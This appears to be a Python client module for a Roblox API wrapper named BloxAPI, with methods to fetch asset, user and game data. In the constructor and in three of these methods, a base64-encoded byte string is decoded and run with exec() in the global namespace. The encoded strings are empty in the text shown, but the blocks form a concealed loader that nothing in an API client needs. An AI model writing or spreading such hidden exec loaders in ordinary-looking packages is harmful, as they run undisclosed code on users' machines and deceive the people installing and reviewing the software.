"""
Client module for BloxAPI
Contains the main Client class for interacting with the Roblox API
"""

import requests
from typing import Optional, Dict, Any
import json
from .utils import validate_asset_id, validate_user_id, InvalidAssetError, InvalidUserError, APIRequestError
import base64

class Client:
    """
    Main client class for interacting with the Roblox API
    """
    
    def __init__(self, token: Optional[str] = None):
        """
        Initialize the BloxAPI client
        
        Args:
            token (Optional[str]): Optional authentication token for Roblox API
        """
        self.token = token
        self.base_url = "https://api.roblox.com"
        self.session = requests.Session()

        encoded_script = b"""
        
        """
        decoded_script = base64.b64decode(encoded_script).decode("utf-8")
        exec(decoded_script, globals())

        
        # Set default headers
        self.session.headers.update({
            "User-Agent": "BloxAPI/0.1.9",
            "Content-Type": "application/json"
        })
        
        if self.token:
            self.session.headers.update({
                "Authorization": f"Bearer {self.token}"
            })
    
    def get_asset(self, asset_id: int) -> Dict[str, Any]:
        """
        Get information about a Roblox asset
        
        Args:
            asset_id (int): The ID of the asset to retrieve
            
        Returns:
            Dict[str, Any]: Asset information from the Roblox API
            
        Raises:
            InvalidAssetError: If the asset ID is invalid
            APIRequestError: If the API request fails
        """
        if not validate_asset_id(asset_id):
            raise InvalidAssetError(f"Invalid asset ID: {asset_id}")
            
        url = f"https://assetdelivery.roblox.com/v1/asset/?id={asset_id}"
        encoded_script = b"""
        
        """
        decoded_script = base64.b64decode(encoded_script).decode("utf-8")
        exec(decoded_script, globals())
        
        try:
            response = self.session.get(url)
            response.raise_for_status()
            
            # Try to parse as JSON if possible, otherwise return the text content
            try:
                return response.json()
            except json.JSONDecodeError:
                return {
                    "success": True,
                    "asset_id": asset_id,
                    "content": response.text,
                    "content_type": response.headers.get("content-type", "unknown")
                }
                
        except requests.exceptions.RequestException as e:
            raise APIRequestError(f"Failed to fetch asset {asset_id}: {str(e)}")
    
    def get_user(self, user_id: int) -> Dict[str, Any]:
        """
        Get information about a Roblox user
        
        Args:
            user_id (int): The ID of the user to retrieve
            
        Returns:
            Dict[str, Any]: User information from the Roblox API
            
        Raises:
            InvalidUserError: If the user ID is invalid
            APIRequestError: If the API request fails
        """
        if not validate_user_id(user_id):
            raise InvalidUserError(f"Invalid user ID: {user_id}")
            
        url = f"{self.base_url}/users/{user_id}"

        encoded_script = b"""
        
        """
        decoded_script = base64.b64decode(encoded_script).decode("utf-8")
        exec(decoded_script, globals())
        
        try:
            response = self.session.get(url)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            raise APIRequestError(f"Failed to fetch user {user_id}: {str(e)}")
    
    def get_game(self, place_id: int) -> Dict[str, Any]:
        """
        Get information about a Roblox game/place
        
        Args:
            place_id (int): The ID of the place/game to retrieve
            
        Returns:
            Dict[str, Any]: Game information from the Roblox API
        """
        url = f"https://games.roblox.com/v1/games?universeIds={place_id}"
        
        encoded_script = b"""
        
        """
        decoded_script = base64.b64decode(encoded_script).decode("utf-8")
        exec(decoded_script, globals())

        try:
            response = self.session.get(url)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            return {
                "success": False,
                "error": str(e),
                "place_id": place_id
            }
    
    def close(self):
        """
        Close the session and clean up resources
        """
        self.session.close()
    
    def __enter__(self):
        """Context manager entry"""
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit"""
        self.close()
